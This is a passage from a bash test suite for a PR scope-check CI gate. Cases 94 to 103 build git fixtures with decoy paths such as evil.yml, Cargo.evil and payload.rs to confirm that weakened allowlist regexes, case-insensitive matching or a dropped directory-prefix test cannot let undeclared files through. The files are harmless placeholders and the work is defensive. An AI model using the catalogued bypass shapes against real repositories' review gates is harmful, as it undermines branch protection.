elif ! echo "$OUT93" | grep -qF 'crates/b/fuzz/Cargo.lock'; then
  echo "FAIL: refused, but crates/b/fuzz/Cargo.lock was not named among the undeclared paths. Got:"
  echo "$OUT93" | sed 's/^/    /'
  FAILED=1
else
  note "an unrelated crate's nested lockfile does not ride a different crate's declared manifest bump"
fi

# ---------------------------------------------------------------------------
# 94. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.lock, filename token
#     (round nine: a measured survivor of round nine's OWN re-run sweep,
#     not hypothesised). Cases 78-80 pin the "fuzz" directory token, the
#     leading "crates" directory token, and dropping the extension entirely,
#     but none of them pins the middle ground: widening the literal
#     "Cargo\.lock" filename to "[^/]+\.lock" still requires a *.lock
#     extension, so it slips past case 80's non-.lock fixture while still
#     admitting any lockfile NAME, not only the real one, inside a real
#     fuzz/ directory. Its content is never checked by anything in this
#     script (manifest_disallowed_diff only ever runs over a path ending in
#     Cargo.toml), so this is a full content bypass, not merely scope.
# ---------------------------------------------------------------------------
D94="$WORK/bot-allowed-a5-filename-token-lock-name"
new_repo "$D94"
mkdir -p "$D94/crates/pol/fuzz"
printf 'placeholder\n' > "$D94/README.md"
commit_all "$D94" base
git -C "$D94" checkout -qb pr
printf 'attacker-controlled content, never named Cargo.lock, no sibling manifest reviews it\n' > "$D94/crates/pol/fuzz/other.lock"
commit_all "$D94" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.lock, filename token): crates/pol/fuzz/other.lock must be refused =="
OUT94="$(run_scope "$D94")" && RC94=0 || RC94=$?
if [ "$RC94" -eq 0 ]; then
  echo "FAIL: case 94 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT94" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT94" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: crates/pol/fuzz/other.lock was reported EXEMPT. Got:"
  echo "$OUT94" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT94" | grep -qF 'crates/pol/fuzz/other.lock'; then
  echo "FAIL: refused, but crates/pol/fuzz/other.lock was not named among the offending paths. Got:"
  echo "$OUT94" | sed 's/^/    /'
  FAILED=1
else
  note "a *.lock file inside a real fuzz dir that is not literally Cargo.lock is refused (pins the filename token; a mutant here bypasses the content check entirely, not merely scope)"
fi

# ---------------------------------------------------------------------------
# 95. BOT_ALLOWED sweep, \.github/workflows/[^/]+\.ya?ml, "workflows"
#     directory token (round nine: a measured survivor of round nine's OWN
#     re-run sweep, not hypothesised). Case 83 pins this shape too, but its
#     fixture (.github/actions/setup/action.yml) is nested THREE components
#     below .github/, one deeper than the widened-by-one-token mutant
#     (`\.github/[^/]+/[^/]+\.ya?ml`, which still requires exactly TWO
#     components) actually admits, so case 83 never reaches this mutant at
#     all: it is refused by both the real regex and the mutant, for
#     unrelated reasons (depth), and proves nothing about the dir token.
#     This fixture is exactly two components deep, the shape the mutant was
#     built to admit.
# ---------------------------------------------------------------------------
D95="$WORK/bot-allowed-a6-dir-token-shallow"
new_repo "$D95"
mkdir -p "$D95/.github"
printf 'placeholder\n' > "$D95/README.md"
commit_all "$D95" base
git -C "$D95" checkout -qb pr
mkdir -p "$D95/.github/actions"
printf 'name: deploy\non: push\njobs: {}\n' > "$D95/.github/actions/deploy.yml"
commit_all "$D95" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/workflows, dir token, shallow): .github/actions/deploy.yml must be refused =="
OUT95="$(run_scope "$D95")" && RC95=0 || RC95=$?
if [ "$RC95" -eq 0 ]; then
  echo "FAIL: case 95 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT95" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT95" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: .github/actions/deploy.yml was reported EXEMPT. Got:"
  echo "$OUT95" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT95" | grep -qF '.github/actions/deploy.yml'; then
  echo "FAIL: refused, but .github/actions/deploy.yml was not named among the offending paths. Got:"
  echo "$OUT95" | sed 's/^/    /'
  FAILED=1
else
  note "a YAML file exactly two components under .github, in a dir literally named anything but workflows, is refused (pins the workflows-dir token at the depth the one-token relaxation actually admits)"
fi

# ===========================================================================
# ROUND TEN: BLOCKING findings from round nine's independent review, closed
# by mechanically enumerating the relaxation SPACE from the regex text
# itself (scratchpad/r10/enumerate.py: tokenizes each alternative, then
# applies escape-strip, whole-component-widen, sub-literal suffix-widen and
# anchor-drop operators to every atom it finds), not by hand-listing the
# handful of relaxations a reviewer happened to name. That generator
# produced 49 candidate BOT_ALLOWED mutants and 6 candidate ALWAYS_ALLOWED
# mutants; every one of them was actually run against the committed suite
# (scratchpad/r10/sweep.sh, an index/line-scoped mutator plus a driver whose
# CAUGHT verdict requires rc EXACTLY 1 AND a real FAIL line in the log --
# built in from the start, because round nine's own reviewer's first sweep
# scored 38/38 CAUGHT at rc=127 on a host with no `timeout` binary, before
# it added that same guard). 29 of the 55 regex mutants survived; cases
# 96-100 below close every one of them, several fixtures at a time where a
# single discriminating path refutes more than one mutant. The remaining
# two BLOCKING findings are not regex mutations at all: case sensitivity
# (every `grep -qE "$VAR"` call site gating one of these two allowlists,
# found by grepping the script, not guessed) and the directory-declaration
# arm (every occurrence of the `*/) case "$f" in "$d"*) <var>=1;; esac ;;`
# shape, likewise grepped, not hand-listed); cases 101-104 close those
# (101-102 the two case-sensitivity call sites, 103-104 the two directory-
# declaration arms; the previous version of this comment said "101-103" and
# undercounted its own work by one case).
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# 96. BOT_ALLOWED sweep, dot-escape unpinned on every manifest filename
#     literal, all five manifest alternatives at once (round ten: mechanically
#     enumerated from the regex itself, not spot-checked one alternative at a
#     time -- see scratchpad/r10/enumerate.py). Dropping ONE backslash from
#     any of Cargo\.toml, Cargo\.lock, crates/[^/]+/Cargo\.toml,
#     crates/[^/]+/fuzz/Cargo\.toml or crates/[^/]+/fuzz/Cargo\.lock turns
#     that literal dot into an ERE "any character", admitting a same-length
#     path with an arbitrary byte where the dot belongs (real grep -E
#     applies no filesystem special-casing to `.`, so even a literal `/`
#     would match). A SIXTH fixture pins both fuzz-dir manifests' trailing
#     extension in one shot: widening `Cargo\.toml` or `Cargo\.lock` to
#     `Cargo\.[^/]+` inside `crates/<n>/fuzz/` admits ANY extension, and
#     because the two alternatives differ only in which one is mutated, not
#     in what the mutant then admits, the identical fixture (`Cargo.evil`)
#     refutes either one.
# ---------------------------------------------------------------------------
D96="$WORK/bot-allowed-manifest-dot-escape-sweep"
new_repo "$D96"
mkdir -p "$D96/crates/pol/fuzz"
printf 'placeholder\n' > "$D96/README.md"
commit_all "$D96" base
git -C "$D96" checkout -qb pr
printf 'attacker-controlled, not a real manifest\n' > "$D96/CargoXtoml"
printf 'attacker-controlled, not a real lockfile\n' > "$D96/CargoXlock"
printf 'attacker-controlled\n' > "$D96/crates/pol/CargoXtoml"
printf 'attacker-controlled\n' > "$D96/crates/pol/fuzz/CargoXtoml"
printf 'attacker-controlled\n' > "$D96/crates/pol/fuzz/CargoXlock"
printf 'attacker-controlled, no sibling manifest reviews it, extension is not toml or lock\n' > "$D96/crates/pol/fuzz/Cargo.evil"
commit_all "$D96" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (dot-escape, all 5 manifest alts + fuzz-dir extension): all 6 fixtures must be refused =="
OUT96="$(run_scope "$D96")" && RC96=0 || RC96=$?
if [ "$RC96" -eq 0 ]; then
  echo "FAIL: case 96 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT96" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT96" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a dot-escape or extension-widen mutant let the whole PR through as EXEMPT. Got:" >&2
  echo "$OUT96" | sed 's/^/    /' >&2
  FAILED=1
fi
if ! echo "$OUT96" | grep -qxF '    CargoXtoml'; then
  echo "FAIL: refused, but the top-level CargoXtoml probe (alt 0's dot-escape) was not named among the offending paths. Got:"
  echo "$OUT96" | sed 's/^/    /'
  FAILED=1
else
  note "a same-length top-level CargoXtoml (any-char instead of the literal dot) is refused (pins alt 0's dot-escape)"
fi
if ! echo "$OUT96" | grep -qxF '    CargoXlock'; then
  echo "FAIL: refused, but the top-level CargoXlock probe (alt 1's dot-escape) was not named among the offending paths. Got:"
  echo "$OUT96" | sed 's/^/    /'
  FAILED=1
else
  note "a same-length top-level CargoXlock (any-char instead of the literal dot) is refused (pins alt 1's dot-escape)"
fi
if ! echo "$OUT96" | grep -qxF '    crates/pol/CargoXtoml'; then
  echo "FAIL: refused, but crates/pol/CargoXtoml (alt 2's dot-escape) was not named among the offending paths. Got:"
  echo "$OUT96" | sed 's/^/    /'
  FAILED=1
else
  note "crates/pol/CargoXtoml is refused (pins alt 2's dot-escape)"
fi
if ! echo "$OUT96" | grep -qxF '    crates/pol/fuzz/CargoXtoml'; then
  echo "FAIL: refused, but crates/pol/fuzz/CargoXtoml (alt 3's dot-escape) was not named among the offending paths. Got:"
  echo "$OUT96" | sed 's/^/    /'
  FAILED=1
else
  note "crates/pol/fuzz/CargoXtoml is refused (pins alt 3's dot-escape)"
fi
if ! echo "$OUT96" | grep -qxF '    crates/pol/fuzz/CargoXlock'; then
  echo "FAIL: refused, but crates/pol/fuzz/CargoXlock (alt 4's dot-escape) was not named among the offending paths. Got:"
  echo "$OUT96" | sed 's/^/    /'
  FAILED=1
else
  note "crates/pol/fuzz/CargoXlock is refused (pins alt 4's dot-escape)"
fi
if ! echo "$OUT96" | grep -qxF '    crates/pol/fuzz/Cargo.evil'; then
  echo "FAIL: refused, but crates/pol/fuzz/Cargo.evil (alts 3 and 4's extension boundary) was not named among the offending paths. Got:"
  echo "$OUT96" | sed 's/^/    /'
  FAILED=1
else
  note "a fuzz-dir Cargo.evil (wrong extension) is refused (pins both alt 3's and alt 4's trailing-extension boundary, whichever one a mutant widens)"
fi

# ---------------------------------------------------------------------------
# 97. BOT_ALLOWED sweep, \.github/workflows/[^/]+\.ya?ml, every remaining
#     one-token relaxation of this alternative (round ten: mechanically
#     enumerated). Cases 81-84 already pin the extension, the single-
#     component depth, the "workflows" directory name and the ".github"
#     directory name against a NESTED .github/actions/... probe; they do not
#     reach the shallower mutants below, each caught by its own
#     generator-derived fixture:
#       - widening the LEADING ".github" component to a bare wildcard, or
#         stripping its escape so only ONE arbitrary character need precede
#         literal "github", both admit a top-level dir that merely ENDS in
#         "github" -- one fixture pins both at once.
#       - stripping the escape on the leading dot while widening "github"
#         itself to any word admits ANY dot-directory, not only .github.
#       - stripping the escape on the extension's dot lets any single
#         character stand in for it.
#       - widening the extension's "y" (before the optional "a") to a
#         wildcard, or widening its "ml" (after the optional "a") to a
#         wildcard, each admit a file that merely ends, or merely starts,
#         with the right piece of "ya?ml" -- two more fixtures, both
#         distinct from the plain-extension case already covered.
# ---------------------------------------------------------------------------
D97="$WORK/bot-allowed-a6-workflows-sweep"
new_repo "$D97"
mkdir -p "$D97/Xgithub/workflows" "$D97/.github/workflows" "$D97/.hub/workflows"
printf 'placeholder\n' > "$D97/README.md"
commit_all "$D97" base
git -C "$D97" checkout -qb pr
printf 'name: deploy\non: push\njobs: {}\n' > "$D97/Xgithub/workflows/evil.yml"
printf 'name: deploy\non: push\njobs: {}\n' > "$D97/.hub/workflows/evil.yml"
printf 'name: deploy\non: push\njobs: {}\n' > "$D97/.github/workflows/evil-yml"
printf 'name: deploy\non: push\njobs: {}\n' > "$D97/.github/workflows/evil.xml"
printf 'name: deploy\non: push\njobs: {}\n' > "$D97/.github/workflows/evil.yxyz"
commit_all "$D97" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/workflows, remaining one-token relaxations): all 5 fixtures must be refused =="
OUT97="$(run_scope "$D97")" && RC97=0 || RC97=$?
if [ "$RC97" -eq 0 ]; then
  echo "FAIL: case 97 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT97" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT97" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a workflows-alternative mutant let the whole PR through as EXEMPT. Got:" >&2
  echo "$OUT97" | sed 's/^/    /' >&2
  FAILED=1
fi
if ! echo "$OUT97" | grep -qxF '    Xgithub/workflows/evil.yml'; then
  echo "FAIL: refused, but Xgithub/workflows/evil.yml was not named among the offending paths. Got:"
  echo "$OUT97" | sed 's/^/    /'
  FAILED=1
else
  note "a top-level dir that merely ends in 'github' (no leading dot) is refused (pins the .github component both as a bare-wildcard widen and as an escape-strip)"
fi
if ! echo "$OUT97" | grep -qxF '    .hub/workflows/evil.yml'; then
  echo "FAIL: refused, but .hub/workflows/evil.yml was not named among the offending paths. Got:"
  echo "$OUT97" | sed 's/^/    /'
  FAILED=1
else
  note "a dot-directory that is not literally .github is refused (pins the leading dot staying escaped while 'github' itself is widened)"
fi
if ! echo "$OUT97" | grep -qxF '    .github/workflows/evil-yml'; then
  echo "FAIL: refused, but .github/workflows/evil-yml was not named among the offending paths. Got:"
  echo "$OUT97" | sed 's/^/    /'
  FAILED=1
else
  note "a workflows file with no dot before its extension is refused (pins the extension dot's escape)"
fi
if ! echo "$OUT97" | grep -qxF '    .github/workflows/evil.xml'; then
  echo "FAIL: refused, but .github/workflows/evil.xml was not named among the offending paths. Got:"
  echo "$OUT97" | sed 's/^/    /'
  FAILED=1
else
  note "a workflows file ending in .xml (not .yml or .yaml) is refused (pins the 'y' half of ya?ml)"
fi
if ! echo "$OUT97" | grep -qxF '    .github/workflows/evil.yxyz'; then
  echo "FAIL: refused, but .github/workflows/evil.yxyz was not named among the offending paths. Got:"
  echo "$OUT97" | sed 's/^/    /'
  FAILED=1
else
  note "a workflows file starting with y but not ending in ml (not .yml or .yaml) is refused (pins the 'ml' half of ya?ml)"
fi

# ---------------------------------------------------------------------------
# 98. BOT_ALLOWED sweep, \.github/dependabot\.yml, every remaining one-token
#     relaxation of this alternative (round ten: mechanically enumerated).
#     Cases 84 and 85 already pin the "dependabot" name and the extension
#     against siblings that still live directly under a real .github/; they
#     do not reach the leading-directory-token mutants below:
#       - widening ".github" to a bare wildcard, or stripping its escape so
#         one arbitrary character stands in for the dot, both admit a
#         top-level dir that merely ends in "github" -- one fixture pins
#         both.
#       - stripping the escape on the extension's dot lets any single
#         character stand in for it (round nine's own review's "a6e").
#       - stripping the escape on the leading dot while widening "github"
#         itself to any word admits any dot-directory.
# ---------------------------------------------------------------------------
D98="$WORK/bot-allowed-a7-dependabot-sweep"
new_repo "$D98"
mkdir -p "$D98/Xgithub" "$D98/.github" "$D98/.hub"
printf 'placeholder\n' > "$D98/README.md"
commit_all "$D98" base
git -C "$D98" checkout -qb pr
printf 'name: dependabot\n' > "$D98/Xgithub/dependabot.yml"
printf 'name: dependabot\n' > "$D98/.github/dependabotXyml"
printf 'name: dependabot\n' > "$D98/.hub/dependabot.yml"
commit_all "$D98" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/dependabot.yml, remaining one-token relaxations): all 3 fixtures must be refused =="
OUT98="$(run_scope "$D98")" && RC98=0 || RC98=$?
if [ "$RC98" -eq 0 ]; then
  echo "FAIL: case 98 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT98" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT98" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a dependabot.yml-alternative mutant let the whole PR through as EXEMPT. Got:" >&2
  echo "$OUT98" | sed 's/^/    /' >&2
  FAILED=1
fi
if ! echo "$OUT98" | grep -qxF '    Xgithub/dependabot.yml'; then
  echo "FAIL: refused, but Xgithub/dependabot.yml was not named among the offending paths. Got:"
  echo "$OUT98" | sed 's/^/    /'
  FAILED=1
else
  note "a top-level dir that merely ends in 'github' (no leading dot) is refused (pins the .github component both as a bare-wildcard widen and as an escape-strip)"
fi
if ! echo "$OUT98" | grep -qxF '    .github/dependabotXyml'; then
  echo "FAIL: refused, but .github/dependabotXyml was not named among the offending paths. Got:"
  echo "$OUT98" | sed 's/^/    /'
  FAILED=1
else
  note "a dependabot file with no dot before its extension is refused (pins the extension dot's escape)"
fi
if ! echo "$OUT98" | grep -qxF '    .hub/dependabot.yml'; then
  echo "FAIL: refused, but .hub/dependabot.yml was not named among the offending paths. Got:"
  echo "$OUT98" | sed 's/^/    /'
  FAILED=1
else
  note "a dot-directory that is not literally .github is refused (pins the leading dot staying escaped while 'github' itself is widened)"
fi

# ---------------------------------------------------------------------------
# 99. BOT_ALLOWED sweep, packages/[^/]+/package(-lock)?\.json, every
#     remaining one-token relaxation of this alternative (round ten:
#     mechanically enumerated). Cases 86-88 already pin the filename, the
#     leading directory and the depth; they do not reach the extension's
#     escape, the extension's wildcard-widen, or either shape of widening
#     the optional "(-lock)?" group's own content:
#       - stripping the escape on the extension's dot.
#       - widening the extension itself to a wildcard (round nine's own
#         review's "a7e").
#       - widening the ENTIRE optional-group content to a wildcard, so
#         package<anything>.json is admitted even with no separator.
#       - widening only the content AFTER the group's literal dash (round
#         nine's own review's "a7d"), so package-<anything>.json is
#         admitted.
# ---------------------------------------------------------------------------
D99="$WORK/bot-allowed-a8-packages-sweep"
new_repo "$D99"
mkdir -p "$D99/packages/dash"
printf 'placeholder\n' > "$D99/README.md"
commit_all "$D99" base
git -C "$D99" checkout -qb pr
printf '{"not":"json-shaped, no dot at all"}\n' > "$D99/packages/dash/packageXjson"
printf 'console.log("not a manifest at all");\n' > "$D99/packages/dash/package.js"
printf '{"not":"package or package-lock"}\n' > "$D99/packages/dash/packageXYZ.json"
printf '{"not":"package-lock either"}\n' > "$D99/packages/dash/package-evil.json"
commit_all "$D99" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (packages/.../package(-lock)?.json, remaining one-token relaxations): all 4 fixtures must be refused =="
OUT99="$(run_scope "$D99")" && RC99=0 || RC99=$?
if [ "$RC99" -eq 0 ]; then
  echo "FAIL: case 99 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT99" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT99" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a package(-lock)?.json-alternative mutant let the whole PR through as EXEMPT. Got:" >&2
  echo "$OUT99" | sed 's/^/    /' >&2
  FAILED=1
fi
if ! echo "$OUT99" | grep -qxF '    packages/dash/packageXjson'; then
  echo "FAIL: refused, but packages/dash/packageXjson was not named among the offending paths. Got:"
  echo "$OUT99" | sed 's/^/    /'
  FAILED=1
else
  note "a package file with no dot before its extension is refused (pins the extension dot's escape)"
fi
if ! echo "$OUT99" | grep -qxF '    packages/dash/package.js'; then
  echo "FAIL: refused, but packages/dash/package.js was not named among the offending paths. Got:"
  echo "$OUT99" | sed 's/^/    /'
  FAILED=1
else
  note "package.js (not .json) is refused (pins the extension's own wildcard-widen boundary)"
fi
if ! echo "$OUT99" | grep -qxF '    packages/dash/packageXYZ.json'; then
  echo "FAIL: refused, but packages/dash/packageXYZ.json was not named among the offending paths. Got:"
  echo "$OUT99" | sed 's/^/    /'
  FAILED=1
else
  note "package immediately followed by an unrecognised suffix before .json is refused (pins the optional group's content as a whole)"
fi
if ! echo "$OUT99" | grep -qxF '    packages/dash/package-evil.json'; then
  echo "FAIL: refused, but packages/dash/package-evil.json was not named among the offending paths. Got:"
  echo "$OUT99" | sed 's/^/    /'
  FAILED=1
else
  note "package-evil.json (dash present but not -lock) is refused (pins the optional group's content after its own literal dash)"
fi

# ---------------------------------------------------------------------------
# 100. ALWAYS_ALLOWED sweep, ^(CHANGELOG\.md)$, every one-token relaxation
#      of the ONE rule that gates every ordinary, human-authored PR (round
#      ten, BLOCKING: this allowlist had never been swept at all before this
#      round -- mechanically enumerated the same way as BOT_ALLOWED). Case
#      69 is a positive control (CHANGELOG.md itself must be exempt); none
#      of the five fixtures below is CHANGELOG.md, and every one of them
#      must stay undeclared-and-refused:
#        - stripping the dot's escape admits a same-length CHANGELOGXmd.
#        - widening "CHANGELOG" to a wildcard admits ANY root .md file
#          (README.md here), letting an unrelated doc ride along undeclared.
#        - widening the "md" extension to a wildcard admits CHANGELOG.txt.
#        - dropping the leading anchor turns the match into "ends with
#          CHANGELOG.md", admitting a NESTED docs/CHANGELOG.md.
#        - dropping the trailing anchor turns it into "starts with
#          CHANGELOG.md", admitting CHANGELOG.md.bak (the ALWAYS_ALLOWED
#          twin of case 5's BOT_ALLOWED Cargo.toml.bak).
# ---------------------------------------------------------------------------
D100="$WORK/always-allowed-sweep"
new_repo "$D100"
mkdir -p "$D100/src" "$D100/docs"
printf 'orig\n' > "$D100/src/a.rs"
commit_all "$D100" base
git -C "$D100" checkout -qb pr
printf 'changed\n' > "$D100/src/a.rs"
printf 'attacker-controlled, same length as CHANGELOG.md\n' > "$D100/CHANGELOGXmd"
printf '# not the changelog\n' > "$D100/README.md"
printf 'attacker-controlled, right name wrong extension\n' > "$D100/CHANGELOG.txt"
printf 'attacker-controlled, nested\n' > "$D100/docs/CHANGELOG.md"
printf 'stale copy\n' > "$D100/CHANGELOG.md.bak"
commit_all "$D100" implement
fake_gh 'coder-agent' 'Closes #5' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `src/a.rs` | modify | the only file this issue declares |
'
echo "== ALWAYS_ALLOWED sweep: 5 undeclared, non-CHANGELOG.md fixtures must all stay refused =="
OUT100="$(run_scope "$D100")" && RC100=0 || RC100=$?
if [ "$RC100" -eq 0 ]; then
  echo "FAIL: case 100 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT100" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT100" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: an ALWAYS_ALLOWED mutant let the whole PR through as matching issue #5. Got:" >&2
  echo "$OUT100" | sed 's/^/    /' >&2
  FAILED=1
fi
if ! echo "$OUT100" | grep -qxF '    CHANGELOGXmd'; then
  echo "FAIL: refused, but CHANGELOGXmd was not named among the undeclared paths. Got:"
  echo "$OUT100" | sed 's/^/    /'
  FAILED=1
else
  note "CHANGELOGXmd (any char instead of the literal dot) is refused (pins ALWAYS_ALLOWED's dot-escape)"
fi
if ! echo "$OUT100" | grep -qxF '    README.md'; then
  echo "FAIL: refused, but README.md was not named among the undeclared paths. Got:"
  echo "$OUT100" | sed 's/^/    /'
  FAILED=1
else
  note "an unrelated root README.md is refused (pins ALWAYS_ALLOWED's CHANGELOG name, not just any .md file)"
fi
if ! echo "$OUT100" | grep -qxF '    CHANGELOG.txt'; then
  echo "FAIL: refused, but CHANGELOG.txt was not named among the undeclared paths. Got:"
  echo "$OUT100" | sed 's/^/    /'
  FAILED=1
else
  note "CHANGELOG.txt (right name, wrong extension) is refused (pins ALWAYS_ALLOWED's .md extension)"
fi
if ! echo "$OUT100" | grep -qxF '    docs/CHANGELOG.md'; then
  echo "FAIL: refused, but docs/CHANGELOG.md was not named among the undeclared paths. Got:"
  echo "$OUT100" | sed 's/^/    /'
  FAILED=1
else
  note "a nested docs/CHANGELOG.md is refused (pins ALWAYS_ALLOWED's leading anchor)"
fi
if ! echo "$OUT100" | grep -qxF '    CHANGELOG.md.bak'; then
  echo "FAIL: refused, but CHANGELOG.md.bak was not named among the undeclared paths. Got:"
  echo "$OUT100" | sed 's/^/    /'
  FAILED=1
else
  note "CHANGELOG.md.bak is refused (pins ALWAYS_ALLOWED's trailing anchor)"
fi

# ---------------------------------------------------------------------------
# 101. BOT_ALLOWED sweep, case sensitivity (round ten, BLOCKING). Line 633's
#      match is `grep -qE`, not `grep -qEi`; adding that one `i` would make
#      the entire bot allowlist case-insensitive on a filesystem (and a CI
#      runner) that is itself case-sensitive, admitting `cargo.toml` where
#      only `Cargo.toml` is reviewed content. None of cases 70-99 differ
#      from an allowlisted path only in case, so none of them can observe
#      this flag.
# ---------------------------------------------------------------------------
D101="$WORK/bot-allowed-case-sensitivity"
new_repo "$D101"
printf 'placeholder\n' > "$D101/README.md"
commit_all "$D101" base
git -C "$D101" checkout -qb pr
# Deliberately does NOT also create a real `Cargo.toml` in this fixture: on a
# case-preserving-but-case-INSENSITIVE filesystem (the default on macOS,
# where this suite is also run locally) writing `cargo.toml` right after
# `Cargo.toml` overwrites the SAME directory entry instead of creating a
# second one, so `changed` would contain only `Cargo.toml` (unchanged case)
# with mutated content, not the lowercase probe this case exists to test
# (caught directly: the first version of this fixture did exactly that, and
# the file that showed up in the manifest-parse failure was spelled with a
# capital C). A single brand-new `cargo.toml`, with nothing of the real name
# to collide with, exercises the same case-sensitivity question without
# depending on the host filesystem's own case-folding behaviour.
printf 'attacker-controlled, differs from the real manifest only in case\n' > "$D101/cargo.toml"
commit_all "$D101" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (case sensitivity): cargo.toml (lowercase) must be refused =="
OUT101="$(run_scope "$D101")" && RC101=0 || RC101=$?
if [ "$RC101" -eq 0 ]; then
  echo "FAIL: case 101 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT101" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT101" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: cargo.toml (lowercase) was reported EXEMPT. Got:"
  echo "$OUT101" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT101" | grep -qxF '    cargo.toml'; then
  echo "FAIL: refused, but cargo.toml was not named among the offending paths. Got:"
  echo "$OUT101" | sed 's/^/    /'
  FAILED=1
else
  note "cargo.toml (lowercase) is refused (pins BOT_ALLOWED's case sensitivity)"
fi

# ---------------------------------------------------------------------------
# 102. ALWAYS_ALLOWED sweep, case sensitivity (round ten, BLOCKING). Line
#      803's match is also `grep -qE`, not `grep -qEi`; the identical `i`
#      flag here would exempt `changelog.md` from needing its own Files row
#      on the case-sensitive path every ordinary PR takes.
# ---------------------------------------------------------------------------
D102="$WORK/always-allowed-case-sensitivity"
new_repo "$D102"
mkdir -p "$D102/src"
printf 'orig\n' > "$D102/src/a.rs"
commit_all "$D102" base
git -C "$D102" checkout -qb pr
printf 'changed\n' > "$D102/src/a.rs"
printf 'attacker-controlled, differs from CHANGELOG.md only in case\n' > "$D102/changelog.md"
commit_all "$D102" implement
fake_gh 'coder-agent' 'Closes #5' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `src/a.rs` | modify | the only file this issue declares |
'
echo "== ALWAYS_ALLOWED sweep (case sensitivity): changelog.md (lowercase) must stay undeclared =="
OUT102="$(run_scope "$D102")" && RC102=0 || RC102=$?
if [ "$RC102" -eq 0 ]; then
  echo "FAIL: case 102 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT102" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT102" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: changelog.md (lowercase) rode ALWAYS_ALLOWED's exemption. Got:" >&2
  echo "$OUT102" | sed 's/^/    /' >&2
  FAILED=1
elif ! echo "$OUT102" | grep -qxF '    changelog.md'; then
  echo "FAIL: refused, but changelog.md was not named among the undeclared paths. Got:"
  echo "$OUT102" | sed 's/^/    /'
  FAILED=1
else
  note "changelog.md (lowercase) is refused (pins ALWAYS_ALLOWED's case sensitivity)"
fi

# ---------------------------------------------------------------------------
# 103. The directory-declaration arm's own prefix test (round ten,
#      BLOCKING). Line 826 is `*/) case "$f" in "$d"*) ok=1;; esac ;;`;
#      collapsing it to `*/) ok=1 ;;` means that as soon as the issue
#      declares ANY directory (a Files row ending in a slash), every changed
#      file in the PR is accepted, whatever its path -- a total collapse of
#      scope enforcement. Cases 65-68 (and the sibling cargo_lock_exempt arm
#      a few lines above this one) only ever exercise this shape on a file
#      that IS under the declared directory, so none of them can tell "the
#      prefix was checked and matched" apart from "the prefix was never
#      checked at all". This case declares only `docs/` and adds an
#      unrelated `evil/payload.rs` alongside a legitimately-covered
#      `docs/x.md`, so it fails only if the prefix test itself is gone.
# ---------------------------------------------------------------------------
D103="$WORK/dir-declaration-arm-refuses-outside-prefix"
new_repo "$D103"
mkdir -p "$D103/docs"
printf 'orig\n' > "$D103/docs/x.md"
commit_all "$D103" base
git -C "$D103" checkout -qb pr
printf 'changed\n' > "$D103/docs/x.md"
mkdir -p "$D103/evil"
printf 'attacker-controlled, not under the declared directory\n' > "$D103/evil/payload.rs"
commit_all "$D103" implement
